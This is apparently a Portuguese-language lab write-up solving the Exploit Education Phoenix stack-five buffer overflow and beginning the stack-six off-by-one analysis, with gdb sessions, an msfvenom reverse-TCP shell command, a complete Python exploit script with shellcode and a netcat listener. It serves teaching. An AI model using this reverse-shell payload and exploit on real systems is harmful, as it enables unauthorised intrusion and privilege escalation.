<p>Para completar, precisamos executar nosso pr√≥prio c√≥digo (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
<a class="header" href="print.html#agora-em-asm-d-analise-est√°tica" id="agora-em-asm-d-analise-est√°tica"><h2>Agora em ASM :D (analise est√°tica)</h2></a>
<p>Normalmente, o gdb printa assim:</p>
<pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</code></pre>
<p>Porem, eu removi os endere√ßos para simplificar, e s√≥ mantive os importantes!</p>
<p>Primeiro, vamos ver main</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    &lt;- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   &lt;- args de puts
mov    edi,0x400620
call   0x400400 &lt;puts@plt&gt;        &lt;- call puts
   
   
mov    eax,0x0                    &lt;- args de start_level (nenhum)
call   0x40058d &lt;start_level&gt;     &lt;- call start_level
   
   
mov    eax,0x0                    &lt;- exit code (c√≥digo de saida, 0=sem erro)
leave                             &lt;- Epilogo  
</code></pre>
<p>Agora vamos ver start_level</p>
<pre><code class="language-x86asm">gef&gt; disassemble start_level 
push   rbp
mov    rbp,rsp                  &lt;- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         &lt;- rax = Pointer para buffer[128]
mov    rdi,rax                &lt;- rdi = rax

0x000000000040059c &lt;+15&gt;:
call   0x4003f0 &lt;gets@plt&gt;    &lt;- call gets


nop
leave                         &lt;- Epilogo
ret
</code></pre>
<p>Agora vamos adicionar um breakpoint!</p>
<a class="header" href="print.html#breakpoint" id="breakpoint"><h3>Breakpoint</h3></a>
<blockquote>
<p>Breakpoint = ponto de pausa</p>
</blockquote>
<p>Antes daquela intrus√£o ser executada, sera substitu√≠da por <code>0xCC</code>. Isso faz o  debugger pausar a execu√ß√£o do programa naquela instru√ß√£o!</p>
<p>Quando continuamos executando (normalmente o comando √© <strong>continue</strong>), o <code>0xCC</code> √© substitu√≠do pela instru√ß√£o certa :D</p>
<p>Se voc√™ esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
<pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
Breakpoint 1 at 0x40059c
</code></pre>
<p>&quot;b&quot; √© o comando do gdb para adicionar um breakpoint \
A &quot;*&quot; tem haver com aquele dos pointers \
O endere√ßo √© para &quot;<code>call gets</code>&quot;</p>
<blockquote>
<p>Dica: se voc√™ selecionar/sublinhar (clique esquerdo e passa o mouse em cima, voc√™ sabe do que eu to falando), e clicar o bot√£o do meio no mouse (a rodinha)
o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para voc√™! Ent√£o n√£o precisa copiar o endere√ßo manualmente :D</p>
</blockquote>
<a class="header" href="print.html#agora-vamos-executar-o-programa-analise-din√¢mica" id="agora-vamos-executar-o-programa-analise-din√¢mica"><h2>Agora vamos executar o programa (analise din√¢mica)</h2></a>
<p>126 As n√£o causam erro, e 127 As causam... ue, mas pq? n√£o era pra dar erro s√≥ em 128?</p>
<pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c &quot;print('A'*127)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
</code></pre>
<p>Isso vai ser muito importante no pr√≥ximo desafio: buffers s√£o terminados com um null byte!</p>
<p>Por enquanto, isso s√≥ nos mostra que o compilador n√£o adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
<p>E n√≥s ja sabemos como controlar o EIP, ent√£o agora s√≥ precisamos saber para onde redirecionar a execu√ß√£o :)</p>
<a class="header" href="print.html#encontrar-endere√ßo-do-buffer" id="encontrar-endere√ßo-do-buffer"><h2>Encontrar endere√ßo do buffer</h2></a>
<p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
<blockquote>
<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'<em>100)&quot;)</em>*7fff....</p>
</blockquote>
<p>stack
<img src="./img/stack_five/before_gets_2.png" alt="" /></p>
<p>Voc√™ tamb√©m acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
<p>(((Insira aquele meme muito velho da cabra gritando)))</p>
<p>Ent√£o vamos avan√ßar para pr√≥xima instru√ß√£o (step: <code>s</code>) :D
<img src="./img/stack_five/gef_after_gets_0.png" alt="" /></p>
<p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s √© o comando para printar strings
0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
</code></pre>
<p>Ent√£o nos ja temos o endere√ßo dos nossos As :D ... que em breve ser√£o shellcode :D</p>
<p>Mas agora precisamos saber com precis√£o quantos As at√© o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
</code></pre>
<p>A ultima linha √© a mais importante!</p>
<p>RIP em: <code>0x7fffffffe638</code></p>
<p>Ent√£o para encontrar precisamente quantos As precisamos colocar at√© chegarmos no RIP,
basta subtrair <code>endere√ßo do rip salvo - endere√ßo dos As</code></p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; 0x7fffffffe638 - 0x00007fffffffe5b0
136
</code></pre>
<p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
<p><img src="./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
<p>RIP = BBBB (42424242) :D</p>
<a class="header" href="print.html#nop-sled" id="nop-sled"><h2>NOP sled</h2></a>
<p>Entretanto, como nada pode ser simples nesse mundo do desenvolvimento de exploits, n√≥s n√£o conseguimos saber com precis√£o que o buffer vai estar naquela localiza√ß√£o :(</p>
<p>Isso ocorre pois as envs s√£o alocadas na stack. E elas variam muito, por exemplo, s√≥ de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
<blockquote>
<p>Dica: O gef pode nos ajudar a encontra-las
<img src="./img/stack_five/gef_envs_1.png" alt="" /></p>
</blockquote>
<p>Por exemplo:</p>
<p><img src="./img/stack_five/gef_envs_0.png" alt="" /></p>
<p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
<p>(Outro m√©todo de remedia√ß√£o √© mencionado em <code>stack-six</code>)</p>
<p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>era√ß√£o) ! √© uma instru√ß√£o que n√£o faz nada :D</p>
<p>A representa√ß√£o em machine code do NOP √© <code>0x90</code> :D Bem f√°cil de decorar, quem me dera escola fosse f√°cil assim hehehe :)</p>
<p>O processador vai fazer nada e passar para a pr√≥xima, e se n√≥s colocarmos v√°rios desses em sequencia, o RIP vai &quot;deslizando&quot; atrav√©s at√© chegar no nosso c√≥digo!</p>
<p>Voc√™ pode imaginar um escorregador :D yuuuuupiii</p>
<p><img src="./img/panda_slide_1.gif" alt="" /></p>
<p>Ent√£o a gente redireciona o RIP para o meio do escorregador de NOPs, para ele deslizar at√© o nosso c√≥digo :D</p>
<p>Assim, mesmo se o buffer estiverem em um endere√ßo diferente, o RIP vai chegar no nosso shellcode</p>
<p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
<p>O input que vai passar vai conter:</p>
<pre><code class="language-x86asm">NOP * 135
0xCC
Endere√ßo para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
</code></pre>
<p>E os <strong>breakpoints do gdb ser√£o removidos</strong>, ent√£o caso encontremos um breakpoint, foi o <code>0xCC</code> acima</p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -&gt; '\xb6\xe5\xff\xff\xff\x7f'
</code></pre>
<p>Agora executando:</p>
<pre><code class="language-x86asm">r &lt;&lt;&lt; $(python -c &quot;print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Nos recebemos uma SIGTRAP (chegou no breakpoint)</p>
<pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
</code></pre>
<p>E na se√ß√£o <code>code</code> do gef
<img src="./img/stack_five/gef_run_xCC.png" alt="" />
Meio dif√≠cil de ver, mas tem:</p>
<pre><code class="language-x86asm">NOP
NOP
INT3
(bad)
(bad)
</code></pre>
<blockquote>
<p>int3 √© o nome de 0xCC, da mesma maneira que NOP √© o nome de 0x90</p>
</blockquote>
<p>Apos a nossa ultima instru√ß√£o ha instru√ß√µes invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
<a class="header" href="print.html#shellcode" id="shellcode"><h2>Shellcode</h2></a>
<p>Shellcode √© o c√≥digo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) n√£o autorizada )</p>
<p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
<blockquote>
<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
</blockquote>
<pre><code>No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b&quot;&quot;
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

</code></pre>
<p>Agora, vamos fazer um exploit mais bem feito! <code>vim /tmp/gerar_exploit.py</code></p>
<pre><code class="language-python">buf =  b&quot;&quot;

# shellcode
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>O script /tmp/gerar_exploit.py vai gerar o que colocar√≠amos no input, mas ao inv√©s de printarmos para o terminal, vamos salvar em um arquivo bin√°rio (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)!</p>
<p>Depois √© s√≥ ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code></p>
</blockquote>
<p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: viola√ß√£o de segmento</code></p>
<a class="header" href="print.html#corrigindo-o-problema" id="corrigindo-o-problema"><h2>Corrigindo o problema</h2></a>
<p>Nessa eu empaquei, e a solu√ß√£o veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
<p>Ent√£o valeu pela ajuda :D</p>
<p>Ao inv√©s de colocar o endere√ßo do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
<p>E o beneficio √© que, por estarmos pulando para uma parte est√°tica, e usando-a para redirecionar para o buffer, n√£o corremos o risco do buffer mudar de endere√ßo!</p>
<p>Isso quer dizer que n√£o precisamos mais do NOP slide :D</p>
<a class="header" href="print.html#rop-gadgets" id="rop-gadgets"><h3>ROP Gadgets</h3></a>
<p>Essa √© uma t√©cnica chamada programa√ß√£o <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que voc√™ precisa saber por enquanto √© que cada um desses <code>jmps</code> √© chamado de <strong>gadget</strong></p>
<p>Gadgets s√£o instru√ß√µes em outras partes do programa, que s√£o reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamada <code>ROPgadget</code></p>
<pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
</code></pre>
<p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endere√ßo que rsp, e convenientemente o inicio do nosso buffer
<img src="./img/stack_five/gef_rax.png" alt="" /></p>
<p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
<p>Assim, n√£o vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
<p>S√≥ precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
<p>Ent√£o vamos modificar o exploit :D</p>
<pre><code>Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se voc√™ n√£o quiser ver a solu√ß√£o enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<pre><code class="language-python">buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>Eu removi o <strong>b&quot;&quot;</strong> pq tava dando problema :(</p>
</blockquote>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<p><img src="./img/stack_five/Exploit_working.png" alt="" /></p>
<blockquote>
<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais us√°vel</p>
</blockquote>
<p>Se nos tiv√©ssemos executado o programa como root, a nossa shell teria esses privil√©gios elevados ! :D</p>
<p><img src="./img/stack_five/root_exploit.png" alt="" /></p>
<p><code>UID = 0</code> quer dizer que possu√≠mos privil√©gios de root, mesmo que o <code>whoami</code> n√£o tenha dito root</p>
<p>E se o programa estivesse exposto para a rede, poder√≠amos conseguir uma root shell remota :D (spoiler para os pr√≥ximos desafios hehehe)</p>
<hr />
<p>Voc√™ chegou at√© aqui :D</p>
<p>Toma mais um gif de panda como presente</p>
<p><img src="./img/panda_slide_0.gif" alt="" /></p>
<a class="header" href="print.html#-solu√ß√£o-5" id="-solu√ß√£o-5"><h1>üí´ Solu√ß√£o</h1></a>
<blockquote>
<p>vim /tmp/gerar_exploit.py</p>
</blockquote>
<pre><code>buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<a class="header" href="print.html#-dicas-2" id="-dicas-2"><h1>üí° Dicas</h1></a>
<p>Off-by-one BOF</p>
<a class="header" href="print.html#-explica√ß√£o-4" id="-explica√ß√£o-4"><h1>üõ∏ Explica√ß√£o</h1></a>
<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome √© usado para gerar uma mensagem de boas vindas! \
Esse processo de gerar as mensagens √© vulner√°vel a buffer overflow!</p>
<a class="header" href="print.html#analisando-o-programa-1" id="analisando-o-programa-1"><h2>Analisando o programa</h2></a>
<a class="header" href="print.html#main" id="main"><h3>main</h3></a>
<pre><code class="language-C">int main(int argc, char **argv) {
  char *ptr;
  printf(&quot;%s\n&quot;, BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }

  printf(&quot;%s\n&quot;, greet(ptr));
  return 0;
}
</code></pre>
<p>Main come√ßa definindo um pointer (<code>ptr</code>) e printando o banner</p>
<p>Em seguida, faz verifica√ß√µes relacionadas √† arquitetura do sistema usando o diretivo:
<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamada <code>NOME</code> existe.</p>
<p>Isso √© usado para tornar o inicio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
<p>Por isso nos n√£o a encontramos no c√≥digo fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no bin√°rio:
<img src="./img/stack_six/Messages_ARCH.png" alt="Diferen√ßa entre as arquiteturas" /></p>
<p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
<p>Depois, √© checado se ptr √© NULL (a env var n√£o existe)</p>
<p>Caso n√£o exista: usa a fun√ß√£o errx() para interromper a execu√ß√£o com uma mensagem de erro! errx() recebe 2 argumento: (c√≥digo_do_erro, mensagem_do_erro)</p>
<p>No nosso caso:</p>
<pre><code class="language-C">  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }
    // C√≥digo de erro: 1
   // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
</code></pre>
<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o c√≥digo retornado pelo ultimo programa
<img src="./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
<blockquote>
<p>0 = sem erro, 1 = erro</p>
</blockquote>
<p>por ultimo, <code>greet()</code> √© chamada, e o valor retornado por ela √© printado!</p>
<p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
<a class="header" href="print.html#dica" id="dica"><h4>Dica</h4></a>
<p>Para definir uma env var no gdb</p>
<p><img src="./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
<blockquote>
<p>set environment ExploitEducation=ABC</p>
</blockquote>
<a class="header" href="print.html#greet" id="greet"><h3>greet</h3></a>
<pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize &gt; (sizeof(buffer) - /* garantir termina√ß√£o com null */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);			// Inicio da mensagem de boas vindas
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
</code></pre>
<p>Agora chega a parte vulner√°vel! D:</p>
<p>A fun√ß√£o <code>greet</code> recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
<p>S√£o definidas duas vari√°veis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho m√°ximo)</p>
<p>O tamanho de <code>who</code> √© salvo em <code>maxSize</code></p>
<blockquote>
<p>Lembrete: Buffers s√£o terminados com um NULL byte, portanto um buffer[128] s√≥ armazena 127 letras!</p>
</blockquote>
<p>Em seguida, √© checado se <code>maxSize</code> √© maior que o <code>tamanho(buffer) - 1</code> (-1 por causa no null byte final)</p>
<p>Caso seja maior, <code>maxSize</code> vai ser definido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
<blockquote>
<p>Portando, o limite de maxSize √© 127</p>
</blockquote>
<p>Essa √© uma tentativa de prevenir o buffer overflow! Pois, s√≥ seriam copiados 127 bytes, impedindo o overflow D:</p>
<p>Mas aqui que entra o problema: essa contagem n√£o leva em considera√ß√£o o inicio da mensagem (<code>what</code>)! Aquele que era dependente da arquitetura :D</p>
<p>Ent√£o nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do c√≥digo que causa a vulnerabilidade</p>
<pre><code class="language-C">strcpy(buffer, what); // what = inicio da mensagem
strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
</code></pre>
<p>Nos ja sabemos como o <code>strcpy</code> funciona (voc√™ passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho!
Caso nos consegu√≠ssemos controlar what, poder√≠amos facilmente exploitar o programa)</p>
<p>str <strong>N</strong> cpy (<code>strncpy</code>) √© similar a <code>strcpy</code>, mas recebe um terceiro par√¢metro: tamanho!</p>
<p>Esse tamanho √© limitado √† 127 (limite de <code>maxSize</code>), ent√£o teoricamente n√£o seria exploitavel :(</p>
<p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
<p>O tamanho do inicio √© 34 bytes (na vers√£o amd64)</p>
<pre><code class="language-python">$ python3
&gt;&gt;&gt; x = &quot;Welcome, I am pleased to meet you &quot;
&gt;&gt;&gt; len(x)
34
</code></pre>
<p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
<p>Ent√£o se n√£o fosse pelo inicio da mensagem, n√£o seria exploitavel :D</p>
<p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
<a class="header" href="print.html#analisando-o-programa-asm" id="analisando-o-programa-asm"><h2>Analisando o programa (ASM)</h2></a>
<a class="header" href="print.html#main-1" id="main-1"><h3>main</h3></a>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    ; Prologo
sub    rsp,0x20


mov    DWORD PTR [rbp-0x14],edi
mov    QWORD PTR [rbp-0x20],rsi
mov    edi,0x400878
call   0x400530 &lt;puts@plt&gt;        ; printar o banner


mov    edi,0x4008c2               ; o 1¬∫ argumento √© &quot;ExploitEducation&quot;
call   0x400520 &lt;getenv@plt&gt;      ; Le as env vars e coloca &quot;ExploitEducation&quot; em rax


mov    QWORD PTR [rbp-0x8],rax    ; Pointer para rax
cmp    QWORD PTR [rbp-0x8],0x0    ; Compara esse pointer com 0x0 
                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; tamb√©m deveria funcionar,
                                  ; mas salvando nesse pointer, podemos usar o valor depois)

jne    0x4007dd &lt;main+66&gt;         ; Jump not equal (pular se a compara√ß√£o anterior for diferente)
                                  ; Mas pular para onde? Para main+66 (logo depois da mensagem de erro)
                                  ; Ou melhor: Caso ExploitEducation esteja definida, nos n√£o emitimos erro

Essa parte s√≥ executa caso ExploitEducation n√£o exista {
        mov    esi,0x4008d8               ; 2¬∫ argumento
        mov    edi,0x1                    ; 1¬∫ argumento
        mov    eax,0x0                    ; Valor retornado por main
        call   0x400540 &lt;errx@plt&gt;        ; Interrompe a execu√ß√£o e sai com erro
}



        0x4007dd &lt;main+66&gt;:
mov    rax,QWORD PTR [rbp-0x8]      ; Lembra daquele pointer que salvamos com o rax de getenv() ? 
                                    ; Coloca ele em rax de novo :D

mov    rdi,rax                      ; 1¬∫ argumento: rax (o valor da env ExploitEducation)
call   0x4006fd &lt;greet&gt;             ; Chama greet()
   
mov    rdi,rax                      ; 1¬∫ argumento: O valor que greet retornou (salvo em rax)
call   0x400530 &lt;puts@plt&gt;          ; Printa a mensagem de boas vindas para o terminal
   
   
mov    eax,0x0                      ; Valor retornado por main: 0 (sem erro)
leave                               ; Epilogo
ret    
</code></pre>
<p>N√£o √© t√£o relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o c√≥digo fonte!</p>
<p>Mas caso queira, voc√™ pode analisar por conta pr√≥pria e relacionar o ASM com o c√≥digo fonte por treino :D</p>
<a class="header" href="print.html#fuzz" id="fuzz"><h2>Fuzz</h2></a>
<p>Agora que sabemos que √© poss√≠vel realizar o overflow, vamos ver o que √© corrompido :D</p>
<p>Nos s√≥ podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: ent√£o <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
<p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
<pre><code class="language-x86asm">gef&gt; disassemble greet 
Dump of assembler code for function greet:
   0x00000000004006fd &lt;+0&gt;:	push   rbp
   0x00000000004006fe &lt;+1&gt;:	mov    rbp,rsp		&lt;---
   0x0000000000400701 &lt;+4&gt;:	push   rbx
   0x0000000000400702 &lt;+5&gt;:	sub    rsp,0xa8
.......
.......
   0x0000000000400798 &lt;+155&gt;:	pop    rbx
   0x0000000000400799 &lt;+156&gt;:	pop    rbp		&lt;---
   0x000000000040079a &lt;+157&gt;:	ret    
End of assembler dump
</code></pre>
<p>Vamos colocar uma no inicio de greet e uma no final! :D</p>
<pre><code class="language-x86asm">gef&gt; b *0x4006fe 
Breakpoint 1 at 0x4006fe

gef&gt; b *0x40079a
Breakpoint 2 at 0x40079a
</code></pre>
<a class="header" href="print.html#e-vamos-rodar-com-127-as" id="e-vamos-rodar-com-127-as"><h2>E vamos rodar com 127 As:</h2></a>
<p>Obs:</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
</blockquote>
<p>Deve ria funcionar, mas n√£o funciona sei la por que :(</p>
<p>Ent√£o eu rodei em outro terminal!</p>
<blockquote>
<p>python -c &quot;print 'A' * 127&quot;</p>
</blockquote>
<p>E dei Ctrl+shift+C Ctrl+shift+V</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
</blockquote>
<p>eita, overflow no tutorial XD ! O computador ta se revoltando!!</p>
<p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4006fe in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe5c0
 Arglist at 0x7fffffffe580, args: 
 Locals at 0x7fffffffe580, Previous frame's sp is 0x7fffffffe590
 Saved registers:
  rbp at 0x7fffffffe580, rip at 0x7fffffffe588                            &lt;- aqui
</code></pre>
<p>Agora que nos sabemos o endere√ßo de RIP e RBP, podemos checar seu valores:</p>
<pre><code class="language-x86asm">endere√ßo: valor

gef&gt; x/xg 0x7fffffffe580            -&gt; rbp
0x7fffffffe580:	0x00007fffffffe5b0
gef&gt; x/xg 0x7fffffffe588            -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<blockquote>
<p>Obs: o /xg √© s√≥ para a formata√ß√£o ficar leg√≠vel! Significa e<strong>X</strong>tra <strong>G</strong>rande (que √© o tamanho do pointer na arquitetura amd64)!</p>
</blockquote>
